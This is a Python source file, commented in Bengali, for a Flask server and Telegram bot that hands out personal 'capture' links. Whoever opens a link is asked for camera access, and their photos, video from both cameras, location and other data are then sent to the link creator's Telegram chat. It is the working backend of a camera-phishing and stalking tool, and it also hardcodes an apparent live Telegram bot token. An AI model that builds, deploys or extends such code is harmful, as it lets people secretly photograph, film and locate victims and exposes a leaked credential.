import os
import uuid
import json
import logging
from datetime import datetime
from flask import Flask, request, render_template, jsonify, send_file
from flask_cors import CORS
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from dotenv import load_dotenv
import base64
from io import BytesIO

# লোড এনভায়রনমেন্ট ভেরিয়েবল
load_dotenv()

# কনফিগারেশন
BOT_TOKEN = os.getenv('BOT_TOKEN', '7697230079:AAHtROsMAfo27ZsiEdMPvZpCFv0KkFA88Hk')
PORT = int(os.getenv('PORT', 3000))
BASE_URL = os.getenv('BASE_URL', 'http://localhost:3000')

# লগিং সেটআপ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask অ্যাপ তৈরি
app = Flask(__name__)
CORS(app)  # CORS সাপোর্ট

# টেলিগ্রাম বট সেটআপ
bot = Bot(token=BOT_TOKEN)

# ইউজার সেশন স্টোর (ইন-মেমরি - প্রোডাকশনে ডাটাবেস ব্যবহার করবেন)
user_sessions = {}  # unique_id -> user_data
user_links = {}     # user_id -> list of links

# ফোল্ডার তৈরি (প্রয়োজন হলে)
os.makedirs('temp', exist_ok=True)

# ================== টেলিগ্রাম বট হ্যান্ডলার ==================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start কমান্ড হ্যান্ডলার"""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username or 'NoUsername'
    
    # ইউনিক আইডি জেনারেট
    unique_id = str(uuid.uuid4())
    
    # ইউজার সেশন সংরক্ষণ
    user_sessions[unique_id] = {
        'user_id': user_id,
        'chat_id': chat_id,
        'username': username,
        'created_at': datetime.now().isoformat(),
        'data_received': []
    }
    
    # ইউজারের লিংক সংরক্ষণ
    if user_id not in user_links:
        user_links[user_id] = []
    
    user_link = f"{BASE_URL}/capture/{unique_id}"
    user_links[user_id].append({
        'link': user_link,
        'id': unique_id,
        'created_at': datetime.now().isoformat()
    })
    
    # ইউজারকে মেসেজ পাঠান
    message = f"🎯 হ্যালো @{username}!\n\n"
    message += f"আপনার পার্সোনাল ক্যাপচার লিংক তৈরি করা হয়েছে:\n\n"
    message += f"{user_link}\n\n"
    message += f"👉 এই লিংকে ক্লিক করুন এবং ক্যামেরা এক্সেস দিন\n"
    message += f"📸 দুটো ক্যামেরা থেকেই ছবি ও ভিডিও ক্যাপচার হবে\n"
    message += f"📍 আপনার লোকেশন ও ডিভাইস ইনফরমেশন সংগ্রহ করা হবে\n\n"
    message += f"⚠️ লিংকটি শুধু আপনার জন্য এবং এখান থেকে আসা সকল তথ্য শুধু আপনি পাবেন!"
    
    await update.message.reply_text(message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/help কমান্ড হ্যান্ডলার"""
    help_text = "🤖 উপলব্ধ কমান্ড:\n"
    help_text += "/start - নতুন ক্যাপচার লিংক তৈরি করুন\n"
    help_text += "/mylinks - আপনার সব লিংক দেখুন\n"
    help_text += "/help - সাহায্য দেখুন"
    
    await update.message.reply_text(help_text)

async def mylinks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/mylinks কমান্ড হ্যান্ডলার"""
    user_id = update.effective_user.id
    links = user_links.get(user_id, [])
    
    if not links:
        await update.message.reply_text("আপনার কোনো লিংক নেই। /start ব্যবহার করে নতুন লিংক তৈরি করুন।")
        return
    
    message = "📋 আপনার তৈরি করা লিংকসমূহ:\n\n"
    for i, item in enumerate(links, 1):
        created_at = datetime.fromisoformat(item['created_at']).strftime("%Y-%m-%d %H:%M")
        message += f"{i}. {item['link']}\n   (তৈরি: {created_at})\n\n"
    
    await update.message.reply_text(message)

# ================== Flask রুটস ==================

@app.route('/')
def home():
    """হোম পেজ"""
    return '''
    <html>
        <head><title>Dual Camera Capture Bot</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(145deg, #2b3a67, #5d5d8a); color: white;">
            <h1>📸 Dual Camera Capture Bot</h1>
            <p>টেলিগ্রাম বট ব্যবহার করতে @YourBotUsername এ /start দিন</p>
            <a href="https://t.me/your_bot_username" style="color: #FFD700;">Go to Bot</a>
        </body>
    </html>
    '''

@app.route('/capture/<user_id>')
def capture_page(user_id):
    """ক্যাপচার পেজ"""
    # চেক করা ইউজার ভ্যালিড কিনা
    if user_id not in user_sessions:
        return '''
        <html>
            <head><title>Invalid Link</title></head>
            <body style="font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(145deg, #2b3a67, #5d5d8a); color: white;">
                <h1>❌ ভুল বা মেয়াদোত্তীর্ণ লিংক</h1>
                <p>এই ক্যাপচার লিংকটি ভ্যালিড নয়। বট থেকে নতুন লিংক নিন।</p>
                <a href="https://t.me/your_bot_username" style="color: #FFD700;">বটে যান</a>
            </body>
        </html>
        ''', 404
    
    # HTML টেমপ্লেট রেন্ডার
    return render_template('index.html', user_id=user_id)

@app.route('/api/capture/<user_id>', methods=['POST'])
def capture_data(user_id):
    """ডাটা রিসিভ করার এন্ডপয়েন্ট"""
    # ইউজার ভ্যালিডেশন
    if user_id not in user_sessions:
        return jsonify({'error': 'Invalid user session'}), 404
    
    user_session = user_sessions[user_id]
    data = request.json
    data_type = data.get('type')
    content = data.get('data')
    
    try:
        # টেলিগ্রামে ডাটা পাঠানো
        if data_type == 'text':
            asyncio.run(send_text_message(user_session['chat_id'], content))
            
        elif data_type == 'photo':
            # বেস64 ইমেজ ডিকোড করে পাঠান
            img_data = base64.b64decode(content['buffer'])
            asyncio.run(send_photo_message(
                user_session['chat_id'], 
                img_data, 
                content.get('caption', '📸 Captured Photo')
            ))
            
        elif data_type == 'video':
            # বেস64 ভিডিও ডিকোড করে পাঠান
            video_data = base64.b64decode(content['buffer'])
            asyncio.run(send_video_message(
                user_session['chat_id'], 
                video_data, 
                content.get('caption', '🎥 Captured Video')
            ))
            
        elif data_type == 'location':
            asyncio.run(send_location_message(
                user_session['chat_id'],
                content['latitude'],
                content['longitude']
            ))
        
        # সেশন আপডেট
        user_session['data_received'].append({
            'type': data_type,
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"Error sending to Telegram: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health_check():
    """হেল্থ চেক এন্ডপয়েন্ট"""
    return jsonify({
        'status': 'OK',
        'users': len(user_sessions),
        'timestamp': datetime.now().isoformat()
    })

# ================== টেলিগ্রাম হেল্পার ফাংশন ==================

async def send_text_message(chat_id, text):
    """টেক্সট মেসেজ পাঠান"""
    try:
        await bot.send_message(chat_id=chat_id, text=text)
    except Exception as e:
        logger.error(f"Error sending text: {e}")

async def send_photo_message(chat_id, photo_data, caption):
    """ফটো মেসেজ পাঠান"""
    try:
        photo_file = BytesIO(photo_data)
        photo_file.name = 'photo.jpg'
        await bot.send_photo(chat_id=chat_id, photo=photo_file, caption=caption)
    except Exception as e:
        logger.error(f"Error sending photo: {e}")

async def send_video_message(chat_id, video_data, caption):
    """ভিডিও মেসেজ পাঠান"""
    try:
        video_file = BytesIO(video_data)
        video_file.name = 'video.webm'
        await bot.send_video(chat_id=chat_id, video=video_file, caption=caption)
    except Exception as e:
        logger.error(f"Error sending video: {e}")

async def send_location_message(chat_id, latitude, longitude):
    """লোকেশন মেসেজ পাঠান"""
    try:
        await bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude)
    except Exception as e:
        logger.error(f"Error sending location: {e}")

# ================== বট সেটআপ ==================

def setup_bot():
    """টেলিগ্রাম বট সেটআপ"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # কমান্ড হ্যান্ডলার যোগ করুন
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("mylinks", mylinks_command))
    
    return application

# ================== মেইন ফাংশন ==================

if __name__ == '__main__':
    # টেলিগ্রাম বট স্টার্ট (একটি আলাদা থ্রেডে)
    import threading
    bot_app = setup_bot()
    
    def run_bot():
        bot_app.run_polling()
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Flask অ্যাপ রান
    app.run(host='0.0.0.0', port=PORT, debug=False)
